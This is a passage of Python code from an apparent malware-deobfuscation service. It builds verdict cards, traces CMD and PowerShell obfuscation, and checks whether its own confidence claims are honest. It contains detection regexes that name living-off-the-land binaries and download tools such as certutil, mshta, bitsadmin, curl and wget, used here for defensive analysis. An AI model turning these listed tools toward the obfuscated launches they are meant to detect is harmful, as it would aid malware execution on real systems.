            _CORPUS = Path("/app/backend/tests/fixtures/adversarial_corpus.jsonl")
            _CORPUS.parent.mkdir(parents=True, exist_ok=True)
            _sha1 = hashlib.sha1(_in.encode("utf-8")).hexdigest()
            # dedupe on sha1 by scanning existing ledger — cheap for <10k entries
            _seen = False
            if _CORPUS.exists():
                for _line in _CORPUS.read_text(encoding="utf-8").splitlines():
                    if _sha1 in _line:
                        _seen = True; break
            if not _seen:
                _CORPUS.open("a", encoding="utf-8").write(_json.dumps({
                    "sha1":    _sha1,
                    "input":   _in[:8192],
                    "engine":  result.get("engine"),
                    "layer_trace": result.get("layer_trace") or [],
                    "user":    user.get("email"),
                    "at":      datetime.now(timezone.utc).isoformat(),
                }, ensure_ascii=False) + "\n")
    except Exception:
        pass

    # ── Feb 2026 · "Pattern-not-recognised" guard ────────────────────
    # If the engine peeled ZERO layers AND the surfaced output is
    # basically the input (echo), stamp a clear "Undecoded" state on the
    # verdict card so the analyst never sees the misleading empty-chain
    # "everything's fine" green flash. Preserves any existing card that
    # actually recovered IOCs / MITRE / LOLBAS.
    try:
        _in_raw = (body.input or "").strip()
        _out_raw = (result.get("output_raw") or result.get("output") or "").strip()
        _out_clean = _out_raw
        for _tok in ("━" * 30, "▼ DECODED OUTPUT", "NIVXRAY INVESTIGATION SUMMARY"):
            _out_clean = _out_clean.split(_tok, 1)[0].strip()
        _steps = det.get("steps") or []
        _no_findings = (
            not (result.get("iocs") or {}).get("urls") and
            not (result.get("iocs") or {}).get("ips") and
            not (result.get("iocs") or {}).get("domains") and
            not (result.get("mitre") or []) and
            not (result.get("lolbas") or [])
        )
        if _in_raw and (not _steps or _out_clean == _in_raw) and _no_findings:
            result["verdict_card"] = {
                "verdict":    "Undecoded",
                "label":      "Undecoded",
                "risk_score": 0,
                "confidence": 0,
                "summary":    "Pattern not recognised — no known encoding matched.",
                "reasons": [
                    "Deterministic engine peeled 0 layers.",
                    "Terminal output matches raw input (no transformation).",
                    "No IOCs / MITRE / LOLBAS surfaced.",
                    "Try: MAGIC ▸ recursive multi-branch search, or add a manual recipe step.",
                ],
                "family":     None,
                "undecoded":  True,
            }

        # ── Feb 2026 · Terminal-output plausibility check ───────────────
        # Even when the pipeline peels several layers, the FINAL output
        # can still be gibberish (over-shooting XOR, missed nested-hex).
        # We compute "payload findings" = findings that came out of the
        # DECODED CONTENT (not from the wrapper) by grepping IOCs/LOLBAS
        # tokens against the terminal output. When the decoded payload
        # itself is empty of findings AND its bytes have no plausible
        # plaintext shape → downgrade to `Partial · Wrapper-Only` so the
        # analyst knows the verdict is inferred from the WRAPPER, not
        # from a successful decode.
        elif _out_clean and _out_clean != _in_raw:
            try:
                from ops_extended import _wordhits as _wh
                from ops_extended import _score_downstream_magic as _mag
                _bytes = _out_clean.encode("latin-1", errors="replace")
                # Which findings actually appear inside the decoded output?
                _urls    = (result.get("iocs") or {}).get("urls") or []
                _ips     = (result.get("iocs") or {}).get("ips") or []
                _domains = (result.get("iocs") or {}).get("domains") or []
                _lolbas  = result.get("lolbas") or []
                _payload_findings = 0
                _out_lc = _out_clean.lower()
                for u in _urls + _domains + _ips:
                    if str(u).lower() in _out_lc:
                        _payload_findings += 1
                for lb in _lolbas:
                    bn = (lb.get("binary") if isinstance(lb, dict) else lb) or ""
                    if bn and bn.lower() in _out_lc:
                        _payload_findings += 1
                _wrapper_only = _payload_findings == 0 and (
                    _urls or _ips or _domains or _lolbas or (result.get("mitre") or [])
                )
                _no_plausibility = _wh(_bytes) < 2 and _mag(_bytes) < 0.30
                if _no_plausibility and (_wrapper_only or _no_findings):
                    result["verdict_card"] = {
                        "verdict":    "Partial",
                        "label":      "Partial Decode",
                        "risk_score": 25,
                        "confidence": 25,
                        "summary":    (
                            "Wrapper-only findings — decoded payload is not "
                            "recognisable plaintext." if _wrapper_only else
                            "Pipeline peeled layers but terminal output isn't recognisable plaintext."
                        ),
                        "reasons": [
                            f"Chain applied {len(_steps)} layer(s) but terminal bytes have < 2 shell/English tokens.",
                            "Verdict tags (LOLBAS/MITRE) come from the OBFUSCATION WRAPPER, not the decoded payload." if _wrapper_only else "No IOCs/LOLBAS/MITRE surfaced from decode.",
                            "Likely over-shot (extra XOR/brute pass) OR under-shot (nested obfuscation not fully unwrapped).",
                            "Try: disable XOR-brute in ADVANCED, or add manual `custom-hex-slash`/`ps-hex-escape` step.",
                        ],
                        "family":       None,
                        "undecoded":    False,
                        "partial":      True,
                        "wrapper_only": bool(_wrapper_only),
                    }
            except Exception:
                pass
    except Exception:
        pass

    # ARB PR-2.1 · Governance Rule 12 · Canonical Artifact Consistency.
    # The synthesize_report() call above ran BEFORE the wrapper-only / undecoded
    # detectors may have overwritten verdict_card. Re-render the OUTPUT summary
    # from the FINAL verdict_card so every consumer (OUTPUT panel, saved case,
    # report_text) shows the same verdict as the analyst-facing verdict card.
    try:
        from investigation_report import synthesize_report as _syn_final
        _vc_final = result.get("verdict_card") or {}
        _vc_verdict = _vc_final.get("verdict") or _vc_final.get("label")
        _vc_score   = _vc_final.get("risk_score") or _vc_final.get("score")
        _vc_conf    = _vc_final.get("confidence")
        if _vc_score is None and isinstance(_vc_conf, (int, float)):
            _vc_score = int(round(float(_vc_conf) * 100)) if _vc_conf <= 1 else int(_vc_conf)
        # Only re-render when the current output summary disagrees with the
        # final verdict_card. Skip the rebuild otherwise so we don't churn
        # deterministic output on paths that didn't mutate the card.
        _current_out = result.get("output") or ""
        _needs_rebuild = (
            _vc_verdict
            and _vc_verdict.lower() not in _current_out.lower().split("nivxray")[-1]
        )
        if _needs_rebuild and _vc_verdict:
            _final_risk = {"verdict": _vc_verdict, "score": _vc_score}
            _final_conf = _vc_score if _vc_score is not None else result.get("confidence")
            _final_txt = _syn_final(
                input_text=body.input or "",
                output_text=result.get("output_raw") or result.get("output") or "",
                engine=result.get("engine"),
                confidence=_final_conf,
                steps=[{"op": s["op"]} for s in det.get("steps") or []],
                iocs=result.get("iocs") or {},
                mitre=result.get("mitre") or [],
                lolbas=result.get("lolbas") or [],
                risk=_final_risk,
                family=None,
                reached_shellcode=bool(result.get("reached_shellcode")),
                corrupted_container=result.get("corrupted_container"),
            )
            if _final_txt:
                _raw = result.get("output_raw") or ""
                _input_text = (body.input or "").strip()
                _DECODED_HDR2 = (
                    "━" * 66 + "\n"
                    + "▼ DECODED OUTPUT" + "\n"
                    + "━" * 66
                )
                if _raw and _raw.strip() != _input_text:
                    result["output"] = f"{_DECODED_HDR2}\n{_raw}\n\n{_final_txt}"
                else:
                    result["output"] = _final_txt
                result["report_text"] = _final_txt
    except Exception:
        # Best-effort re-render; never break the decode contract.
        pass

    # Auto-record into user's Investigation History (fire-and-forget, never blocks)
    try:
        from routers.history import record_investigation
        # Feb 2026 — persist the enriched intelligence with the record so
        # rehydrate shows verdict/IOCs/MITRE identical to the fresh decode.
        vc = result.get("verdict_card") or {}
        verdict_summary = None
        if vc:
            verdict_summary = {
                "verdict":    vc.get("verdict") or vc.get("label"),
                "confidence": vc.get("confidence"),
                "risk_score": vc.get("risk_score") or vc.get("score"),
                "summary":    vc.get("summary") or vc.get("headline"),
                "family":     vc.get("family"),
            }
        await record_investigation(
            user["email"],
            input=body.input, output=result.get("output_raw") or result["output"],
            chain=[s["op"] for s in det.get("steps") or []],
            trace=trace,
            engine=result["engine"], confidence=result["confidence"],
            reached_shellcode=result["reached_shellcode"],
            iocs=result.get("iocs") or {},
            mitre=result.get("mitre") or [],
            verdict=verdict_summary,
            # ▲ IEDDE SSOT (2026-02) — persist so History rehydrate can
            # restore the IEDDE Decision Trace panel + Recovery Status
            # ribbon on case restore without another decode.
            iedde=_canonical_artifact.iedde_trace,
            iedde_terminal_state=_canonical_artifact.iedde_terminal_state,
            canonical_confidence=_canonical_artifact.canonical_confidence,
            canonical_confidence_reason=_canonical_artifact.canonical_confidence_reason,
            verdict_card=result.get("verdict_card"),
        )
    except Exception:
        pass

    # ── RC4.1 · Crypto-API honest-verdict FINAL merge ─────────────────
    # Runs AFTER the IOC/MITRE/LOLBAS enrichment overwrites the mitre list,
    # so the crypto annotations (AES-CBC, RC4, DPAPI, MachineGuid, etc.) are
    # guaranteed to appear in the final response. Also copies static_recovery
    # + crypto_hints from `det` into `result` since the enrichment stage
    # doesn't touch either field.
    try:
        from decoders.crypto_api_annotator import _find_all as _crypto_find  # noqa
        _crypto_hits = _crypto_find((body.input or "").lower())
        if _crypto_hits:
            _existing = result.get("mitre") or []
            _seen = {(m.get("id") if isinstance(m, dict) else str(m)) for m in _existing}
            for h in _crypto_hits:
                for mid in h.get("mitre") or []:
                    if mid not in _seen:
                        _seen.add(mid)
                        _existing.append({
                            "id":        mid,
                            "technique": h.get("algorithm", "Cryptography"),
                            "tactic":    "Defense Evasion",
                            "evidence":  f"{h.get('algorithm')} · key_source={h.get('key_source')} "
                                         f"· recovery={h.get('recovery')}",
                            "source":    "rc41-crypto-annotator",
                        })
            result["mitre"] = _existing
            result["crypto_hints"] = _crypto_hits
            _stat = sum(1 for h in _crypto_hits if h.get("recovery") == "static-complete")
            _rt   = sum(1 for h in _crypto_hits if h.get("recovery") == "runtime-required")
            result["static_recovery"] = {
                "static_stages":  _stat,
                "runtime_stages": _rt,
                "verdict":        (
                    "static-recovery-complete · runtime-decryption-required"
                    if _rt > 0 else "static-recovery-complete"
                ),
            }
            banner = "▼ CRYPTO API DETECTED (RC4.1 · honest-verdict)\n" + "\n".join(
                f"  · {h['algorithm']:<24} key_source={h['key_source']} recovery={h['recovery']}"
                for h in _crypto_hits
            ) + "\n\n"
            result["output_raw"] = banner + str(result.get("output_raw") or result.get("output") or "")
    except Exception:
        pass

    # ── RC4.2 · CMD/PowerShell evaluation trace ────────────────────
    # Even when the orchestrator adopts a chain that doesn't include our
    # batch-envvar-substitute op, if the raw input has the pattern we run
    # the decoder directly and attach a transformation_trace so analysts
    # see the reconstruction steps (p = c_a_l_c_._e_x_e → remove '_' →
    # calc.exe → start calc.exe). Closes the "stopped at %p:_=%" gap
    # reported by external reviewers.
    try:
        import re as _re
        src = body.input or ""
        # ── Interpreter Gate (Workspace bug fix · Feb 2026) ──────────
        # PowerShell-specific normalization stages MUST NOT run against
        # non-PowerShell interpreters (Bash / CMD / OpenSSL / etc.).
        # Subtractive guard: only KNOWN non-PS interpreters skip PS
        # stages; ambiguous inputs preserve prior behaviour so no
        # legitimate PowerShell path regresses. See regression tests
        # in test_interpreter_gate.py.
        def _looks_like_non_powershell(text: str) -> bool:
            if not text:
                return False
            stripped = text.lstrip()
            # #!/bin/bash, #!/usr/bin/env bash, etc.
            if stripped.startswith("#!"):
                shebang = stripped.split("\n", 1)[0].lower()
                if any(s in shebang for s in
                       ("bash", "/sh", "zsh", "ksh", "dash", "python")):
                    return True
            first_tok = _re.match(r"[^\s;&|]+", stripped)
            if not first_tok:
                return False
            head = first_tok.group(0).lower()
            # Strip leading path components: /bin/bash → bash
            if "/" in head:
                head = head.rsplit("/", 1)[-1]
            _NON_PS_HEADS = {
                "eval", "exec", "sh", "bash", "dash", "zsh", "ksh",
                "openssl", "tr", "sed", "awk", "xxd", "rev", "curl",
                "wget", "python", "python3", "perl", "ruby", "node",
                "cmd", "cmd.exe",
            }
            if head in _NON_PS_HEADS:
                return True
            # Bash command-substitution "$(..." or backtick-substitution
            # at the leading position — these are Bash grammar, never PS.
            if stripped.startswith("$(") or stripped.startswith("`"):
                return True
            return False

        _skip_ps_stages = _looks_like_non_powershell(src)
        trace = []
        # Pattern 1: SET var + %var:from=to%
        set_re = _re.compile(r"""(?:^|[\s&])set\s+["']?(\w+)["']?\s*=\s*["']?([^"'\r\n&|<>]+?)["']?(?=\s*(?:&&?|\|\|?|$|\r|\n))""",
                              _re.IGNORECASE | _re.MULTILINE)
        sub_re = _re.compile(r"""%(\w+):([^=%]{0,64})=([^%]{0,64})%""")
        substr_re = _re.compile(r"""%(\w+):~\s*(-?\d+)\s*(?:,\s*(-?\d+))?\s*%""")
        env = {m.group(1).lower(): m.group(2) for m in set_re.finditer(src)}
        for m in set_re.finditer(src):
            trace.append({"step": "set-var", "detail":
                          f"{m.group(1)} = {m.group(2)}"})
        for m in sub_re.finditer(src):
            var, frm, to = m.group(1).lower(), m.group(2), m.group(3)
            val = env.get(var, "")
            resolved = val.replace(frm, to) if val else "(unresolved)"
            trace.append({"step": "envvar-substitute",
                          "detail": f"%{m.group(1)}:{frm}={to}%  →  "
                          f"'{val}'.replace('{frm}','{to}') = '{resolved}'"})
        if substr_re.search(src):
            for m in substr_re.finditer(src):
                trace.append({"step": "envvar-substring",
                              "detail": f"%{m.group(1)}:~{m.group(2)},"
                              f"{m.group(3) or ''}%  →  slice"})
        if trace:
            result["transformation_trace"] = trace
            # Also inject the ops into the recipe so downstream UI/analysts
            # see the deterministic step chain instead of an empty chain.
            existing_ops = {r.get("op") for r in (result.get("recipe") or []) if isinstance(r, dict)}
            recipe = list(result.get("recipe") or [])
            if any(t["step"] in ("envvar-substitute", "set-var") for t in trace) \
                    and "batch-envvar-substitute" not in existing_ops:
                recipe.insert(0, {"op": "batch-envvar-substitute",
                                    "detail": "CMD SET + %VAR:from=to% resolved deterministically"})
            if any(t["step"] == "envvar-substring" for t in trace) \
                    and "cmd-envvar-substring-picker" not in existing_ops:
                recipe.insert(0, {"op": "cmd-envvar-substring-picker",
                                    "detail": "CMD %VAR:~start,len% substring sliced"})
            result["recipe"] = recipe

        # RC4.4 · CMD Runtime Reconstruction Engine — attach the full
        # analyst report (character-extraction table, reconstruction trace,
        # confidence breakdown, ATT&CK map, honest verdict) whenever the
        # input contains ANY of:
        #   * env-var obfuscation ( %VAR:~a,b% / adjacent %A%%B% / !VAR! /
        #     `^` caret escape / `""` quote fragmentation )
        #   * a plain LOLBIN invocation (certutil / mshta / regsvr32 /
        #     rundll32 / wmic / bitsadmin / installutil / etc.) — so even
        #     non-obfuscated malware launchers get the RC4.4 verdict block
        #     + T1218/T1059.003 promoted to top-level result.mitre.
        _lolbin_rx = _re.compile(
            r"\b(?:cmd|powershell|pwsh|wscript|cscript|"
            r"certutil|bitsadmin|mshta|regsvr32|rundll32|installutil|"
            r"msiexec|wmic|schtasks|cmstp|ftp|curl|hh|ieexec|"
            r"calc|notepad)\.exe\b",
            _re.IGNORECASE,
        )
        _has_obf = (
            _re.search(r"%\w+:~-?\d+(?:,-?\d+)?%", src)
            or _re.search(r"%\w+%%\w+%", src)
            or _re.search(r"!\w+(?::[~=][^!]*)?!", src)
            or _re.search(r"[A-Za-z]\^[A-Za-z]", src)
            or _re.search(r'""', src)
        )
        _has_lolbin = bool(_lolbin_rx.search(src))
        # ── ARB PR-2.1.2 · Canonical-First guard ─────────────────────
        # RC4.4 CMD Runtime Reconstruction is designed for CMD /
        # env-var obfuscation patterns where the L0 chain did NOT peel
        # any decoder layer. If the L0 canonical chain has ALREADY
        # recovered the payload (e.g. PS -EncodedCommand → plaintext),
        # running RC4.4 on the raw wrapper just echoes the encoded
        # blob into "Reconstructed Command", which is misleading to
        # analysts. Skip the block in that case — the canonical
        # decoded output is the authoritative artifact.
        _canon_recovered = (
            "_canonical_artifact" in locals()
            and getattr(_canonical_artifact, "terminal_state", None) == "recovered"
            and getattr(_canonical_artifact, "decoded_output", "")
            and _canonical_artifact.decoded_output != src
        )
        if _canon_recovered:
            _has_obf = False
            _has_lolbin = False
        if _has_obf or _has_lolbin:
            try:
                from decoders.cmd_runtime_reconstruct import (
                    run_cmd_runtime_reconstruct as _run_crr,
                    render_report as _render_crr,
                    DEFAULT_PROFILE as _CRR_DEFAULT,
                )
                # Optional profile override — reserved for a follow-up UI
                # panel. For now the default Win10 x64 profile is used.
                _profile = _CRR_DEFAULT
                _custom = None
                _crr = _run_crr(src, profile_name=_profile,
                                 custom_env=_custom)
                banner = _render_crr(_crr)
                result["output_raw"] = banner + "\n" + str(result.get("output_raw") or "")
                result["cmd_runtime_reconstruct"] = _crr
                existing_ops_now = {r.get("op") for r in (result.get("recipe") or [])
                                      if isinstance(r, dict)}
                if "cmd-runtime-reconstruct" not in existing_ops_now:
                    result["recipe"] = [{"op": "cmd-runtime-reconstruct",
                                          "detail": (
                                              f"Runtime reconstruction via profile "
                                              f"{_profile}"
                                          )}] + (result.get("recipe") or [])
                trace_now = result.get("transformation_trace") or []
                for row in _crr.get("character_trace") or []:
                    trace_now.append({
                        "step": "cmd-char-extract",
                        "detail": (
                            f"%{row['variable']}{row['slice'] and (':' + row['slice']) or ''}% "
                            f"→ '{row['character']}'  (from {str(row['value'])[:40]!r})"
                        ),
                    })
                for row in _crr.get("reconstruction_trace") or []:
                    trace_now.append({"step": row["step"], "detail": row["detail"]})
                result["transformation_trace"] = trace_now

                # Promote RC4.4 ATT&CK hints into the top-level
                # ``result.mitre`` list so downstream consumers (verdict
                # card, STIX exporter, dashboards) can see T1218 / T1059
                # even when the LOLBAS shield hasn't fired yet.
                _existing_mitre = {(h.get("id") if isinstance(h, dict) else None)
                                     for h in (result.get("mitre") or [])}
                _promoted = list(result.get("mitre") or [])
                for _h in _crr.get("mitre") or []:
                    if _h.get("id") and _h.get("id") not in _existing_mitre:
                        _promoted.append(_h)
                        _existing_mitre.add(_h.get("id"))
                if _promoted:
                    result["mitre"] = _promoted
            except Exception:
                pass

        # RC4.2 · PowerShell chain evaluator — reverse+regex-swap pipe pattern.
        # Fires on `-replace '(\w+)\.(\w+)','$2.$1'` + `ForEach-Object {$_[-1..-N] -join ''}`
        if not _skip_ps_stages and (_re.search(r"-replace\s*['\"]\([^)]+\)\\\.\([^)]+\)['\"]\s*,\s*['\"]\$2\.\$1['\"]",
                       src, _re.IGNORECASE) or \
           _re.search(r"ForEach-Object\s*\{\s*\$_\[\s*-1\s*\.\.\s*-\d+\s*\]\s*-join",
                       src, _re.IGNORECASE)):
            from operations import run_operation as _run_op_ps_sem
            try:
                sem_out = _run_op_ps_sem("powershell-semantic-mini", src, {})
                if sem_out and not sem_out.startswith("(powershell-semantic-mini"):
                    # Prepend semantic reconstruction banner to output_raw so
                    # analysts see the step-by-step trace + honest verdict.
                    result["output_raw"] = sem_out + "\n" + str(result.get("output_raw") or "")
                    # Add to recipe if not already present
                    if "powershell-semantic-mini" not in {r.get("op") for r in (result.get("recipe") or [])}:
                        result["recipe"] = [{"op": "powershell-semantic-mini",
                                              "detail": "Chain evaluator: -replace + reverse + join"}] + (result.get("recipe") or [])
                    # Also record in transformation_trace
                    trace_now = result.get("transformation_trace") or []
                    for line in sem_out.split("\n"):
                        line = line.strip()
                        if line.startswith("Step "):
                            trace_now.append({"step": "ps-semantic", "detail": line})
                    result["transformation_trace"] = trace_now
            except Exception:
                pass

        # RC4.5 · PowerShell Backtick / Line-Continuation Normalizer —
        # fires when the input contains any backtick (`) AND either
        # (a) a backtick precedes an identifier char (in-token obfusc.)
        # (b) a backtick precedes ``\r?\n`` (line continuation)
        # so both variants trigger the module.
        if (not _skip_ps_stages) and "`" in src and (_re.search(r"`[A-Za-z0-9_]", src)
                              or _re.search(r"`[ \t]*\r?\n", src)):
            from operations import run_operation as _run_op_ps_bt
            try:
                bt_out = _run_op_ps_bt("powershell-backtick-normalize", src, {})
                if bt_out and not bt_out.startswith("(powershell-backtick-normalize"):
                    result["output_raw"] = bt_out + "\n" + str(result.get("output_raw") or "")
                    if "powershell-backtick-normalize" not in {r.get("op") for r in (result.get("recipe") or [])}:
                        result["recipe"] = [{"op": "powershell-backtick-normalize",
                                              "detail": "Backtick / line-continuation collapsed"}] + (result.get("recipe") or [])
                    trace_now = result.get("transformation_trace") or []
                    for line in bt_out.split("\n"):
                        line = line.strip()
                        if line.startswith("Step "):
                            trace_now.append({"step": "ps-backtick-normalize", "detail": line[:200]})
                    result["transformation_trace"] = trace_now
            except Exception:
                pass

        # RC4.5 · PowerShell Alias → Canonical Cmdlet Normalizer — fires
        # only when the input mentions powershell/pwsh (so we don't
        # accidentally rewrite the word ``ls`` inside plain shell text).
        if not _skip_ps_stages and _re.search(r"\b(?:powershell(?:\.exe)?|pwsh(?:\.exe)?)\b", src, _re.IGNORECASE):
            from operations import run_operation as _run_op_ps_alias
            try:
                al_out = _run_op_ps_alias("powershell-alias-normalize", src, {})
                if al_out and not al_out.startswith("(powershell-alias-normalize"):
                    result["output_raw"] = al_out + "\n" + str(result.get("output_raw") or "")
                    if "powershell-alias-normalize" not in {r.get("op") for r in (result.get("recipe") or [])}:
                        result["recipe"] = [{"op": "powershell-alias-normalize",
                                              "detail": "PS aliases expanded to canonical cmdlets"}] + (result.get("recipe") or [])
                    trace_now = result.get("transformation_trace") or []
                    for line in al_out.split("\n"):
                        line = line.strip()
                        if line.startswith("Step "):
                            trace_now.append({"step": "ps-alias-normalize", "detail": line[:200]})
                    result["transformation_trace"] = trace_now
            except Exception:
                pass

        # RC4.3 · PowerShell Normalization + Runtime Reconstruction —
        # fires whenever input mentions powershell/pwsh (any case) AND has
        # at least one dash-prefixed parameter (accepting either whitespace
        # OR comma as the preceding separator — that's the mixed-case
        # comma-obfuscation case).
        if not _skip_ps_stages and _re.search(r"\b(?:powershell(?:\.exe)?|pwsh(?:\.exe)?)\b", src, _re.IGNORECASE) \
                and _re.search(r"[\s,]-[A-Za-z]", src):
            from operations import run_operation as _run_op_ps_norm
            try:
                norm_out = _run_op_ps_norm("powershell-normalize", src, {})
                if norm_out and not norm_out.startswith("(powershell-normalize"):
                    result["output_raw"] = norm_out + "\n" + str(result.get("output_raw") or "")
                    if "powershell-normalize" not in {r.get("op") for r in (result.get("recipe") or [])}:
                        result["recipe"] = [{"op": "powershell-normalize",
                                              "detail": "PS command-line normalization + runtime simulation"}] + (result.get("recipe") or [])
                    trace_now = result.get("transformation_trace") or []
                    for line in norm_out.split("\n"):
                        line = line.strip()
                        if line.startswith("Step ") or line.startswith("Reconstructed") \
                                or line.startswith("Runtime Output"):
                            trace_now.append({"step": "ps-normalize", "detail": line[:200]})
                    result["transformation_trace"] = trace_now
            except Exception:
                pass
    except Exception:
        pass

    # ── RC4.5 · Post-verdict Honesty Linter ─────────────────────────
    # If the verdict is Malicious with high confidence BUT the final
    # output_raw still contains raw obfuscation markers (%, backtick,
    # -replace, -join, [byte[]] loop, base64 blob), we haven't finished
    # reconstruction. Downgrade the confidence label so the analyst sees
    # an honest "partial-reconstruction" state instead of over-claiming.
    try:
        import re as _re2
        out_raw_ck = str(result.get("output_raw") or result.get("output") or "")
        residuals = []
        if _re2.search(r"%\w+:[~=]", out_raw_ck):
            residuals.append("cmd-envvar")
        if _re2.search(r"`\w", out_raw_ck):
            residuals.append("ps-backtick")
        if _re2.search(r"-replace\s+['\"]", out_raw_ck):
            residuals.append("ps-replace")
        if _re2.search(r"\|\s*ForEach-Object\s*\{", out_raw_ck):
            residuals.append("ps-foreach")
        if _re2.search(r"\[byte\[\]\]\s*\(\s*\d", out_raw_ck):
            residuals.append("byte-array-xor")
        if residuals:
            vc = result.get("verdict_card") or {}
            if (vc.get("verdict") or "").lower() == "malicious" \
                    and (vc.get("confidence") or 0) >= 70:
                vc = dict(vc)
                vc["confidence"] = min(vc.get("confidence", 70), 60)
                vc["verdict"] = "partial-reconstruction"
                vc["honesty_note"] = (
                    "Downgraded by RC4.5 honesty linter — residual obfuscation "
                    f"markers still present in output_raw: {residuals}. Reconstruction "
                    "is incomplete; do not treat as fully decoded."
                )
                result["verdict_card"] = vc
            result["honesty_residuals"] = residuals
    except Exception:
        pass

    # ── RC5 · Phase 1 · Semantic Engine v2 stubs ─────────────────────
    # These fields are always emitted (behind the SEMANTIC_ENGINE_V2 flag
    # they are populated; behind the default flag=false they remain empty).
    # UI + downstream consumers can rely on the KEYS existing from Phase 1
    # onwards. See /app/memory/RC5_SEMANTIC_ENGINE_SPEC.md § 14 (feature
    # flag strategy) and § 21 (Phase 1 deliverables).
    try:
        from deps import semantic_engine_v2_enabled
        from engine.exec_graph import SCHEMA_VERSION as _RC5_SV
        _v2_on = semantic_engine_v2_enabled()
        result.setdefault("semantic_ir", None)
        result.setdefault("exec_graph", {"nodes": [], "schema_version": _RC5_SV})
        result.setdefault("behaviors", [])
        result.setdefault("mitre_v2", [])
        result.setdefault("lolbins_v2", {"executed": [], "referenced": [], "expanded": []})
        result.setdefault("verdict_v2", None)
        result.setdefault("explain", None)
        result["semantic_engine_v2"] = _v2_on
    except Exception:
        # Never break /decode/smart on RC5 stub emission — Phase 1 is
        # code-additive-only. Any exception here means the import failed
        # in a mis-configured pod; downstream code paths are unaffected.
        log.exception("RC5 stub emission failed (safe to ignore during Phase 1)")

    # ── Phase 9.4 · Semantic Intelligence (2026-07-27) ────────────────
    # Mirror the /v2/auto-investigate contract on /decode/smart so the
    # classic Workspace sees the SAME recursive deobfuscation +
    # Behavior Storyline + Semantic Intelligence panels as
    # Auto-Investigate. Never break the endpoint on failure — the field
    # is intentionally best-effort.
    try:
        from v2.semantic.ps_semantic import analyze as _ps_semantic_analyze
        # For product parity with /auto-investigate: when the raw input
        # is a naked PowerShell script (no `powershell.exe` wrapper) we
        # synthesise the SAME wrapper the auto-investigate fallback uses
        # so both endpoints normalize their input identically and
        # therefore produce identical semantic output (verdict, MITRE,
        # storyline, etc.). See routers/auto_investigate::
        # _fallback_naked_powershell.
        _sem_input = body.input or ""
        try:
            from routers.auto_investigate import _fallback_naked_powershell as _nps
            if _sem_input and "powershell" not in _sem_input.lower():
                _naked = _nps(_sem_input)
                if _naked:
                    _sem_input = _naked[0]["command_line"]
        except Exception:
            pass
        _sr = _ps_semantic_analyze(_sem_input)
        if _sr and _sr.detected:
            result["semantic"] = _sr.to_dict()
        else:
            # Emit an empty semantic block so the frontend can rely on
            # the KEY existing (matches Auto-Investigate's contract).
            result.setdefault("semantic", {})
    except Exception:  # noqa: BLE001
        log.exception("ps_semantic analyze on /decode/smart failed "
                       "(safe — semantic block set to empty)")
        result.setdefault("semantic", {})

    # ── Phase 4 · Unified Investigation Brain (2026-07-29) ────────────
    # Attach the IU → CRE → RTE → Intent output as a single first-class
    # field so the Workspace UI (and the Evidence Graph) can consume one
    # homogeneous payload. Additive — the field is best-effort and never
    # breaks the endpoint.
    try:
        from v2.investigation.pipeline import investigate as _run_investigation
        _inv = _run_investigation(body.input or "")
        result["investigation"] = _inv.to_dict()
    except Exception:  # noqa: BLE001
        log.exception("investigation pipeline on /decode/smart failed "
                       "(safe — investigation block omitted)")
        result.setdefault("investigation", None)

    # ── v1.5.1 · Surface the RTE recovered payload into the analyst-
    #   facing ``output`` field so the Workspace UI stops rendering the
    #   pre-v1.3.0 orchestrator's garbage-bytes text when the RTE
    #   actually decoded a layer. Also inlines the machine-readable
    #   diagnostic codes (DX1001 / DX2002 / …) as a header block so
    #   analysts and dashboards see them without opening the raw JSON.
    #
    #   Trigger: RTE peeled ≥ 1 layer (i.e. at least one transformation
    #   fired successfully). If it didn't, leave the legacy ``output``
    #   untouched so we never regress simple non-transform samples.
    #
    #   Safety: wrapped in try/except so a malformed investigation
    #   dict can never break /decode/smart. Additive-only.
    try:
        _rte = (result.get("investigation") or {}).get("rte") or {}
        _arts = _rte.get("artifacts") or []
        _steps = _rte.get("steps") or []
        _diags = _rte.get("diagnostics") or []
        if len(_arts) >= 2 and len(_steps) >= 1:
            _final = (_arts[-1].get("content") or "")
            _header_lines = [
                "━" * 66,
                "▼ INVESTIGATION BRAIN · RTE DECODER TRACE",
                "━" * 66,
                f"  stop_reason:      {_rte.get('stop_reason')}",
                f"  depth:            {_rte.get('depth')}   layers: {len(_arts)}   steps: {len(_steps)}",
                f"  determinism_hash: {(_rte.get('determinism_hash') or '')[:16]}",
            ]
            for _s in _steps:
                _header_lines.append(
                    f"  step: {_s.get('transformation')}  "
                    f"L{_s.get('input_layer')}→L{_s.get('output_layer')}  "
                    f"conf={_s.get('confidence')}"
                )
            if _diags:
                _header_lines.append("")
                _header_lines.append("  DIAGNOSTICS:")
                for _d in _diags:
                    _sev = (_d.get("severity") or "").upper()
                    _cause = _d.get("caused_by") or ""
                    _cause_str = f"  ← caused_by={_cause}" if _cause else "  (root)"
                    _header_lines.append(
                        f"    [{_sev:>7}] {_d.get('code')} "
                        f"{_d.get('failure_type') or ''}{_cause_str}"
                    )
                    _reason = (_d.get("reason") or "").strip()
                    if _reason:
                        _header_lines.append(f"             {_reason[:220]}")
            _header_lines.append("━" * 66)
            _header_lines.append("▼ RECOVERED PAYLOAD (final RTE layer)")
            _header_lines.append("━" * 66)
            _brain_block = "\n".join(_header_lines) + "\n" + _final
            # Preserve the legacy output verbatim in ``output_legacy`` in
            # case any UI consumer still keys off the old formatting.
            _legacy = result.get("output") or ""
            result["output_legacy"] = _legacy
            result["output"] = _brain_block
    except Exception:  # noqa: BLE001
        log.exception(
            "v1.5.1 · failed to promote RTE last-layer content into "
            "top-level output (safe — legacy output preserved)"
        )

    # ═══════════════════════════════════════════════════════════════════
    # ADR-0009 · Additive Canonical Investigation Model (CIM) field.
    # `investigation` is a serialization of the CIM built from the
    # in-process analysis result — never from HTTP JSON. If composition
    # fails for any reason, the endpoint still returns its legacy response
    # (the CIM is purely additive; no existing consumer depends on it).
    # ═══════════════════════════════════════════════════════════════════
    try:
        from nivxforge.cim import compose as _cim_compose
        from nivxforge.cim.fact_substrate import from_analysis_result as _cim_facts
        _facts = _cim_facts(
            result,
            input_text=(body.input if hasattr(body, "input") else ""),
            source_endpoint="/api/decode/smart",
        )
        _inv = _cim_compose.from_facts(_facts)
        result["investigation"] = _inv.model_dump(mode="json")
    except Exception:  # noqa: BLE001
        log.exception("ADR-0009 · CIM composition failed (safe — legacy response preserved)")

    # ═══════════════════════════════════════════════════════════════════
    # ADR-0014 · Slice-A · Additive Canonical Investigation Object (CIO).
    # `cio` is the new object-centric source of truth backed by an
    # Evidence Graph. Additive-only: every legacy field remains
